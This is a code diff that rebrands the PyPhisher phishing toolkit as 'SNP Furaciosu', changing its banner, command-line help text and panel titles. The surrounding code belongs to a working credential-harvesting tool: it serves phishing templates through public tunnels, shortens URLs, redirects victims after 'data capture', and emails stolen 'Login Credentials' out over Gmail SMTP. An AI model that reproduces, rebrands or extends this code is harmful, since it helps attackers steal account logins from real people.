@@ -125,8 +125,8 @@ logo = f"""
 {blue}  \___ \| . ` |  ___/  |  __| | | | '__/ _` |/ __| |/ _ \/ __| | | |
 {red}   ____) | |\  | |      | |  | |_| | | | (_| | (__| | (_) \__ \ |_| |
 {yellow} |_____/|_| \_|_|      |_|   \__,_|_|  \__,_|\___|_|\___/|___/\__,_|
-{green}         __/ |{" "*19}       {cyan}[v{version[:3]}]
-{cyan}        |___/  {" "*11}      {red}[By GhostStru]
+{green}                           {" "*19}       {cyan}[v{version[:3]}]
+{cyan}                               {" "*11}      {red}[By GhostStru]
 """
 
 
@@ -271,13 +271,13 @@ print(f"\n{info}Please wait!{nc}")
 
 argparser = ArgumentParser()
 
-argparser.add_argument("-p", "--port", type=int, default=default_port, help=f"PyPhisher's server port [Default : {default_port}]")
-argparser.add_argument("-o", "--option", help="PyPhisher's template index [Default : null]")
+argparser.add_argument("-p", "--port", type=int, default=default_port, help=f"SNP Furaciosu server port [Default : {default_port}]")
+argparser.add_argument("-o", "--option", help="SNP Furaciosu template index [Default : null]")
 argparser.add_argument("-t", "--tunneler", default=default_tunneler, help=f"Tunneler to be chosen while url shortening [Default : {default_tunneler}]")
 argparser.add_argument("-r", "--region", help="Region for loclx [Default: auto]")
 argparser.add_argument("-s", "--subdomain", help="Subdomain for loclx [Pro Account] (Default: null)")
 argparser.add_argument("-u", "--url", help="Redirection url after data capture [Default : null]")
-argparser.add_argument("-m", "--mode", help="Mode of PyPhisher [Default: normal]")
+argparser.add_argument("-m", "--mode", help="Mode of SNP Furaciosu [Default: normal]")
 argparser.add_argument("-e", "--troubleshoot", help="Troubleshoot a tunneler [Default: null]")
 argparser.add_argument("--nokey", help="Use localtunnel without ssh key [Default: False]", action="store_false")
 argparser.add_argument("--kshrt", help="Show kshrt url [Default: False]", action="store_true")
@@ -523,7 +523,7 @@ def show_file_data(file):
     cprint(
         Panel(
             text.strip(),
-            title="[bold green]\x50\x79\x50\x68\x69\x73\x68\x65\x72[/][cyan] Data[/]", 
+            title="[bold green]SNP Furaciosu[/][cyan] Data[/]", 
             title_align="left",
             border_style="blue",
         )
@@ -601,7 +601,7 @@ def internet(url="https://api.github.com", timeout=5):
 # Send mail by smtp library
 def send_mail(msg):
     global email, password, receiver
-    message = f"From: {email}\nTo: {receiver}\nSubject: \x50\x79\x50\x68\x69\x73\x68\x65\x72 Login Credentials\n\n{msg}"
+    message = f"From: {email}\nTo: {receiver}\nSubject: SNP Furaciosu Login Credentials\n\n{msg}"
     try:
         internet()
         with smtp('smtp.gmail.com', 465) as server:
@@ -1071,7 +1071,7 @@ def requirements():
             except Exception as e:
                 print(f"{error}{str(e)}")
             if retry == 1:
-                print(f"\n{error}You haven't allowed storage permission for termux. Closing \x50\x79\x50\x68\x69\x73\x68\x65\x72!\n")
+                print(f"\n{error}You haven't allowed storage permission for termux. Closing!\n")
                 sleep(2)
                 pexit()
     internet()
